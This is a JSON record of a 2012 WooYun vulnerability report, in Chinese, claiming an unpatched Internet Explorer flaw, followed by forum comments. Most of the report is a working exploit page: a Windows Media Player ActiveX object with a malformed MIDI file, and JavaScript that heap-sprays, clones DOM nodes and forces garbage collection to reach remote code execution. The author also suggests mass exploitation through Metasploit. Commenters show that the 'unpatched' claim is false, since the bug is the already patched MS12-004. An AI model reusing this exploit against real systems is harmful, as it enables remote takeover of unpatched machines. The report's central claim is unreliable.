{"id": 21330, "wybug_id": "wooyun-2012-04584", "wybug_title": "IE存在未修复的可利用漏洞", "wybug_corp": "微软", "wybug_author": "code0day", "wybug_date": "2012-02-17 10:14", "wybug_open_date": "2012-02-17 10:14", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器", "浏览器控件漏洞", "缓冲区溢出", "浏览器漏洞利用技巧", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-02-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-02-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可反弹SHELL，获取WINDOWS的权限，可使用MSF批量获取MSF>DB_AUTOPWN 详细说明：  IE 漏洞   漏洞证明：  \n\n\n\n\n\n\n\n\n\n以下是网马\n<object id=\"midi1\" classid=\"clsid:22d6f312-b0f6-11d0-94ab-0080c74c7e95\" codebase=\"http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#version=5,1,52,701\" standby=\"loading microsoft windows media player components...\" type=\"application/x-oleobject\" width=\"320\" height=\"310\"><param name=\"filename\" value=\"./toto.mid\">     <param name=\"animationatstart\" value=\"true\">     <param name=\"transparentatstart\" value=\"true\">     <param name=\"autostart\" value=\"false\">     <param name=\"showcontrols\" value=\"true\">     <param name=\"ShowStatusBar\" value=\"true\">     <param name=\"windowlessvideo\" value=\"true\">     <embed src=\"./toto.mid\" autostart=\"true\" showcontrols=\"true\" showstatusbar=\"1\" bgcolor=\"white\" width=\"320\" height=\"310\"></object><script>var cloned = new Array();var numCloned = 50;function bang(){\t\t\tfor (var i = 0; i < numCloned; i ++)\t{\t\tif ( cloned[i] != null )\t\t{\t\t\tvar s = cloned[i].w0.toString();\t\t\t//alert(s);\t\t}\t}}function exploit(){\t\tvar selob = document.createElement(\"select\");\tselob.w0 = unescape(\"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c\");\tselob.w1 = this;\tselob.w2 = new Array();\tselob.w3 = true;\tselob.w4 = 0x41424344;\tselob.w5 = document.createElement(\"marquee\");\tselob.w6 = undefined;\tselob.w7 = null;\tselob.w8 = alert;\tselob.w9 = RegExp.$1;\tselob.w10 = Infinity;\tselob.w11 = NaN;\tselob.w12 = new Date();\t\tfor (var i = 12; i < 60; i ++)\t{\t\tselob[\"w\"+i.toString()] = 0x41424344;\t}\tfor (var i = 0; i < numCloned; i ++)\t{\t\tcloned[i] = selob.cloneNode(true);\t}\t\tfor (var i = 1; i < numCloned; i += 7)\t{\t\tcloned[i] = null;\t}\tCollectGarbage();\tmidi1.play();\tsetTimeout(function(){bang();}, 5000);}setTimeout(function(){exploit();}, 3000);</script>\n   修复方案：  官方暂未发布补丁，360可以防护。如果变形一下，就不知道了，没有做测试。企业网可得要注意喽。。。   版权声明：转载请注明来源 code0day@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-02-17 10:58 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  MS12-004这个是有补丁的http://technet.microsoft.com/zh-cn/security/bulletin/ms12-004可能棒子系统没打上这个补丁~    \n     2012-02-17 10:58 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个0day不错，P.o.c很完整，但缺一些可本地验证的其他信息。建议原作者联系CNVD，vreport@cert.org.cn，提供metasploit检测脚本以及其他分析信息。CNVD\\CNCERT是MSSCP组成员，与微软安全中心可直接沟通。谢谢。    \n     2012-02-17 11:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @rayh4c 毛线 是不是本机的360 远程的棒子系统啊    \n     2012-02-17 11:11 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @cncert国家互联网应急中心 你是天天上这拉皮条来了啊？    \n     2012-02-17 11:16 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @xsser ...，他好象是正当的生意人，社会责任分工不同嘛！    \n     2012-02-17 11:24 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  @xsser 360不支持韩语系统，所以装了也没办法打补丁，目前只有简体，英文，繁体三个版本。    \n     2012-02-17 11:26 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  @rayh4c  - - 好像没有英文版本，可能以后会有英文韩文世界各国版本，哈哈。    \n     2012-02-17 11:29 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @rayh4c 了解 虚惊一场 不过还是鼓励@code0day 的提交啊 鄙视有东西不分享的人    \n     2012-02-17 14:10 |    \t\tking \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 喜爱安全，网络游戏安全应用漏洞挖掘)\t\t \n  这不是没有修复吧 是你自己没有修复，这漏洞测试过 打了补丁是没有问题的    \n     2012-02-17 14:12 |    \t\triusksk \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        )\t\t \n  坑爹啊，ms12-004共有两个漏洞，midi那个漏洞是windows media player的，只不过是借助IE来实现利用的，哪是啥IE的漏洞。    \n     2012-02-18 09:31 |    \t\tFrankie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 你存在,我的代码里...Line 0://你)\t\t \n  貌似大家都很感冒,有妹子测试成功了么?    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}